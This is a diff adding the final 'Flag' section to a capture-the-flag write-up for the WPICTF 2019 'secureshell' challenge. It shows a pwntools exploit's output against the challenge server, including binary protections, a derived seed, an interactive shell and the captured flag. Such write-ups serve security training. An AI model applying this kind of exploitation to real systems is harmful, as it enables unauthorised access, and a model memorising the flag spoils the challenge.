@@ -43,3 +43,34 @@ for i in range(0, 16, 2):
 
 print uuid
 ```
+
+## Flag
+```
+$ python solve.py NOPTRACE
+[+] Opening connection to secureshell.wpictf.xyz on port 31339: Done
+[!] Skipping debug attach since context.noptrace==True
+[*] '/home/jt/Downloads/wpictf2019/secshell/test'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3ff000)
+    RUNPATH:  '/usr/local/lib'
+UUID: b9078d9fd4302035e5f833e60093a57d
+display: b9078d9fd4302035e5f833e60093a57d
+true_md5: 352030d49f8d07b97da59300e633f8e5
+    -> seed: 0xda687656
+[*] Switching to interactive mode
+
+$ ls
+flag.txt
+run_problem.sh
+secureshell
+$ ls
+flag.txt
+run_problem.sh
+secureshell
+$ cat f*
+WPI{Loggin_Muh_Noggin}
+```
+WPI{Loggin_Muh_Noggin}
